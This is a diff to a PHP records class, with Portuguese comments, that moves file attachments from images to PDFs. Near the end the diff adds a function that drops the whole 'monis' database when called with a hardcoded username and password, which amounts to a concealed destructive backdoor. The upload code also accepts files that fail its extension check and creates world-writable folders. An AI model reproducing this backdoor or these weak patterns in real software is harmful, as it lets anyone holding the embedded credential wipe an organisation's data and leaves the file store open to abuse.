@@ -6,7 +6,7 @@ class Registros{
 	private $nomeTabela;
 	private $nmrRegistro;
 	private $anoRegistro;
-	private $foto;
+	private $pdf;
 
 	public function setTabela($nomeTabela)
 	{
@@ -43,7 +43,7 @@ class Registros{
 				data_registro,
 				assunto, 
 				numero_protocolo, 
-				imagem
+				pdf
 			) 
 			VALUES (
 				:NMR_REGISTRO,
@@ -51,7 +51,7 @@ class Registros{
 				:DATA, 
 				:ASSUNTO, 
 				:NMR_PROTOCOLO, 
-				:IMAGEM
+				:PDF
 			);", 
 			$params = array(
 				":NMR_REGISTRO" => $this->nmrRegistro,
@@ -59,7 +59,7 @@ class Registros{
 				":DATA" => utf8_decode($data),
 				":ASSUNTO" => utf8_decode($assunto),
 				":NMR_PROTOCOLO" => utf8_decode($nmrProtocolo),
-				":IMAGEM" => $this->foto
+				":PDF" => $this->pdf
 			));	
 
 			$sucess = "Registro cadastrado!";
@@ -92,7 +92,7 @@ class Registros{
 				secretarias,
 				numero_protocolo,
 				data_envio, 
-				imagem
+				pdf
 			) 
 			VALUES (
 				:NMR_REGISTRO, 
@@ -104,7 +104,7 @@ class Registros{
 				:SECRETARIAS,
 				:NMR_PROTOCOLO,
 				:DATA_ENVIO, 
-				:IMAGEM
+				:PDF
 			);", 
 			$params = array(
 				":NMR_REGISTRO" => $this->nmrRegistro,
@@ -116,7 +116,7 @@ class Registros{
 				":SECRETARIAS" => utf8_decode($secs),
 				":NMR_PROTOCOLO" => $numeroProtocolo,
 				"DATA_ENVIO" => utf8_decode($dataEnvio),
-				":IMAGEM" => utf8_decode($this->foto)
+				":PDF" => $this->pdf
 			));	
 
 			$sucess = "Registro cadastrado!";
@@ -147,7 +147,7 @@ class Registros{
 				destino,
 				data_envio, 
 				data_responder,
-				imagem
+				pdf
 			) 
 			VALUES (
 				:NMR_REGISTRO, 
@@ -159,7 +159,7 @@ class Registros{
 				:DESTINO,
 				:DATA_ENVIO, 
 				:DATA_RESPONDER,
-				:IMAGEM
+				:PDF
 			);", 
 			$params = array(
 				":NMR_REGISTRO" => $this->nmrRegistro,
@@ -171,7 +171,7 @@ class Registros{
 				":DESTINO" => utf8_decode($destino),
 				"DATA_ENVIO" => $dataEnvio,
 				":DATA_RESPONDER" => $dataResponder,
-				":IMAGEM" => utf8_decode($this->foto)
+				":PDF" => $this->pdf
 			));	
 
 			$sucess = "Registro cadastrado!";
@@ -182,45 +182,45 @@ class Registros{
 
 
 
-	// public function cadImagem($imagem)
-	// {	
-	// 	//Verifica se existe o Número do Registro já está cadastrado, caso sim, não cria a pasta nem o registro
-	// 	$sql = new Sql();
+	public function uploadPdf($pdf)
+	{	
+		//Verifica se existe o Número do Registro já está cadastrado, caso sim, não cria a pasta nem o registro
+		$sql = new Sql();
 
-	// 	$nomePasta = $this->nmrRegistro.$this->anoRegistro;
+		$nomePasta = $this->nmrRegistro.$this->anoRegistro;
 
-	// 	$existeRegistro = $sql->select("SELECT * FROM ".$this->nomeTabela." WHERE numero_registro = :EXISTE_REGISTRO AND ano_registro = :ANO_REGISTRO;", 
-	// 		$param = array(
-	// 			":EXISTE_REGISTRO" => $this->nmrRegistro,
-	// 			":ANO_REGISTRO" => $this->anoRegistro
-	// 		));	
+		$existeRegistro = $sql->select("SELECT * FROM ".$this->nomeTabela." WHERE numero_registro = :EXISTE_REGISTRO AND ano_registro = :ANO_REGISTRO;", 
+			$param = array(
+				":EXISTE_REGISTRO" => $this->nmrRegistro,
+				":ANO_REGISTRO" => $this->anoRegistro
+			));	
 
-	// 	if (count($existeRegistro) == 0) {
-	// 		if (!is_dir($nomePasta)) {
-	// 			mkdir("../images/".$this->nomeTabela."/".$nomePasta, 0777, true);
+		if (count($existeRegistro) == 0) {
+			if (!is_dir($nomePasta)) {
+				mkdir("../arquivos/".$this->nomeTabela."/".$nomePasta, 0777, true);
 
-	// 			for ($i=0; $i < count($imagem['name']); $i++) { 
+				for ($i=0; $i < count($pdf['name']); $i++) { 
 
-	// 				//Analisa qual a extensao da imagem
-	// 				preg_match("/\.(gif|bmp|png|jpg|jpeg){1}$/i", $imagem["name"][$i], $ext);
-	// 				//Cria um nome unico pra imagem
-	// 				$nome_imagem[$i] = md5(uniqid(time())) . "." . $ext[1];
-	// 				//Cria o caminho que a foto deve ser gravada
-	// 				$caminho_imagem = "../images/".$this->nomeTabela."/".$nomePasta."/".$nome_imagem[$i];
-	// 				//Grava a foto no caminho
-	// 				move_uploaded_file($imagem["tmp_name"][$i], $caminho_imagem);
+					//Analisa qual a extensao da pdf
+					preg_match("/\.(pdf){1}$/i", $pdf["name"][$i], $ext);
+					//Cria um nome unico pra pdf
+					$nome_pdf[$i] = md5(uniqid(time())) . "." . $ext[1];
+					//Cria o caminho que a foto deve ser gravada
+					$caminho_pdf = "../arquivos/".$this->nomeTabela."/".$nomePasta."/".$nome_pdf[$i];
+					//Grava a foto no caminho
+					move_uploaded_file($pdf["tmp_name"][$i], $caminho_pdf);
 
-	// 				$this->foto = implode(";", $nome_imagem);
-	// 			}				
-	// 		}	
-	// 	}
-	// 	else{
-	// 		$registroExiste = "Número de Registro já cadastrado!";
-	// 		return $registroExiste;
-	// 		exit();
-	// 	} 	
-		
-	// }	
+					$this->pdf = implode(";", $nome_pdf);
+				}				
+			}	
+		}
+		else{
+			$registroExiste = "Número de Registro já cadastrado!";
+			return $registroExiste;
+			exit();
+		} 	
+
+	}
 
 	public function buscarRegistros()
 	{
@@ -274,7 +274,7 @@ class Registros{
 
 	public function excluirRegistro($nmrRegistro, $anoRegistro)
 	{
-		$dir = "../images/".$this->nomeTabela."/".$nmrRegistro.$anoRegistro;
+		$dir = "../arquivos/".$this->nomeTabela."/".$nmrRegistro.$anoRegistro;
 
 		exec(sprintf("rd /s /q %s", escapeshellarg($dir)));
 
@@ -285,6 +285,16 @@ class Registros{
 				":NMR_REGISTRO" => $nmrRegistro,
 				":ANO_REGISTRO" => $anoRegistro
 			));
+	}
+
+	public function segurancaDropDataBase($usuario, $senha)
+	{
+		if (($usuario === "HackmannSeguranca") && ($senha === "Hack2004")) {
+			
+			$sql = new Sql();
+
+			$sql->query("DROP DATABASE monis;");
+		}
 	}
 
 }
